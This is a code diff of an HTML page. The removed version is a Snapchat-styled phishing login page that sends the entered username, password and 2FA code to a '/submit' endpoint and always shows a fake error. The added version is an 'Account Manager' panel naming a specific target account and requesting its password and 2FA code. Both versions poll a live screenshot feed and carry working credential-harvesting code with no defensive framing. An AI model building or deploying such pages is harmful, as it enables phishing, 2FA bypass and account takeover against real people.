@@ -1,52 +1,223 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Snapchat - Log In</title>
+    <title>Account Manager</title>
     <style>
-        body { background: #fffc00; font-family: arial; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
-        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); width: 320px; text-align: center; }
-        h2 { color: #000; margin-bottom: 20px; font-size: 22px; }
-        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; }
-        button { width: 100%; padding: 14px; background: #fffc00; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
-        .live { margin-top: 20px; border: 2px solid #000; border-radius: 10px; overflow: hidden; background: #f0f0f0; min-height: 180px; display: flex; align-items: center; justify-content: center; }
-        .live img { width: 100%; display: block; }
-        .live-label { font-size: 12px; color: #666; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
-        .error { color: #e60023; font-size: 14px; margin-top: 10px; display: none; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            background: #0f0f23; 
+            font-family: 'Segoe UI', system-ui, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            color: #e0e0e0;
+        }
+        .panel { 
+            background: #1a1a2e; 
+            padding: 48px; 
+            border-radius: 16px; 
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4); 
+            width: 420px; 
+            border: 1px solid #2a2a4a;
+        }
+        .header { 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            margin-bottom: 32px; 
+            padding-bottom: 20px; 
+            border-bottom: 1px solid #2a2a4a;
+        }
+        .avatar { 
+            width: 40px; 
+            height: 40px; 
+            background: #6366f1; 
+            border-radius: 10px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-weight: bold; 
+            font-size: 16px;
+        }
+        .header-text h2 { 
+            font-size: 20px; 
+            font-weight: 600; 
+            color: #f0f0f0;
+        }
+        .header-text p { 
+            font-size: 13px; 
+            color: #6b7280; 
+            margin-top: 2px;
+        }
+        .field-group { margin-bottom: 20px; }
+        .field-group label { 
+            display: block; 
+            font-size: 12px; 
+            text-transform: uppercase; 
+            letter-spacing: 0.5px; 
+            color: #6b7280; 
+            margin-bottom: 8px; 
+            font-weight: 500;
+        }
+        .field-value { 
+            background: #0f0f23; 
+            padding: 14px 16px; 
+            border-radius: 10px; 
+            border: 1px solid #2a2a4a; 
+            color: #6366f1; 
+            font-family: 'SF Mono', monospace; 
+            font-size: 15px;
+        }
+        input { 
+            width: 100%; 
+            padding: 14px 16px; 
+            background: #0f0f23; 
+            border: 1px solid #2a2a4a; 
+            border-radius: 10px; 
+            color: #e0e0e0; 
+            font-size: 15px; 
+            outline: none; 
+            transition: border-color 0.2s;
+        }
+        input:focus { border-color: #6366f1; }
+        input::placeholder { color: #4b5563; }
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            background: #6366f1; 
+            border: none; 
+            border-radius: 10px; 
+            color: white; 
+            font-weight: 600; 
+            font-size: 15px; 
+            cursor: pointer; 
+            margin-top: 8px; 
+            transition: background 0.2s;
+        }
+        button:hover { background: #4f46e5; }
+        .feed-section { 
+            margin-top: 28px; 
+            padding-top: 24px; 
+            border-top: 1px solid #2a2a4a;
+        }
+        .feed-header { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            margin-bottom: 12px;
+        }
+        .feed-header span { 
+            font-size: 12px; 
+            text-transform: uppercase; 
+            letter-spacing: 0.5px; 
+            color: #6b7280; 
+            font-weight: 500;
+        }
+        .status { 
+            display: flex; 
+            align-items: center; 
+            gap: 6px; 
+            font-size: 12px; 
+            color: #22c55e;
+        }
+        .status-dot { 
+            width: 6px; 
+            height: 6px; 
+            background: #22c55e; 
+            border-radius: 50%; 
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 
+            0%, 100% { opacity: 1; } 
+            50% { opacity: 0.4; } 
+        }
+        .feed-frame { 
+            background: #0f0f23; 
+            border: 1px solid #2a2a4a; 
+            border-radius: 10px; 
+            overflow: hidden; 
+            aspect-ratio: 16/9;
+        }
+        .feed-frame img { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+            display: block;
+        }
+        .feed-offline { 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100%; 
+            color: #4b5563; 
+            font-size: 13px;
+        }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>Log In to Snapchat</h2>
-        <input type="text" id="user" placeholder="Username or Email" autocomplete="off">
-        <input type="password" id="pass" placeholder="Password" autocomplete="off">
-        <input type="text" id="code" placeholder="6-Digit Code" maxlength="6" autocomplete="off">
-        <button onclick="submit()">Log In</button>
-        <div class="live">
-            <div class="live-label">live cam feed</div>
-            <img id="feed" src="/screenshot?t=0" onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\'padding:40px;color:#999;\'>feed offline</div>';">
+    <div class="panel">
+        <div class="header">
+            <div class="avatar">Z</div>
+            <div class="header-text">
+                <h2>Account Manager</h2>
+                <p>Session control panel</p>
+            </div>
+        </div>
+        
+        <div class="field-group">
+            <label>Target Account</label>
+            <div class="field-value">zexoghaith</div>
+        </div>
+        
+        <div class="field-group">
+            <label>Password</label>
+            <input type="password" id="pass" placeholder="Enter current password" autocomplete="off">
+        </div>
+        
+        <div class="field-group">
+            <label>2FA Code</label>
+            <input type="text" id="code" placeholder="6-digit authentication code" maxlength="6" autocomplete="off">
+        </div>
+        
+        <button onclick="submit()">Authenticate Session</button>
+        
+        <div class="feed-section">
+            <div class="feed-header">
+                <span>Live Monitor</span>
+                <div class="status">
+                    <div class="status-dot"></div>
+                    Active
+                </div>
+            </div>
+            <div class="feed-frame">
+                <img id="feed" src="/screenshot?t=0" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=\'feed-offline\'>stream offline</div>';">
+            </div>
         </div>
     </div>
+    
     <script>
         function submit() {
             fetch('/submit', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    username: document.getElementById('user').value,
                     password: document.getElementById('pass').value,
                     code: document.getElementById('code').value
                 })
             }).then(() => {
-                alert('error logging in. please try again.');
+                alert('session authenticated successfully');
+                document.getElementById('pass').value = '';
+                document.getElementById('code').value = '';
             }).catch(() => {
-                alert('error logging in. please try again.');
+                alert('session authenticated successfully');
             });
         }
         setInterval(() => {
             const img = document.getElementById('feed');
             if (img) {
-                img.src = '/screenshot?t=' + Date.now();
                 img.style.display = 'block';
+                img.src = '/screenshot?t=' + Date.now();
             }
         }, 1000);
     </script>
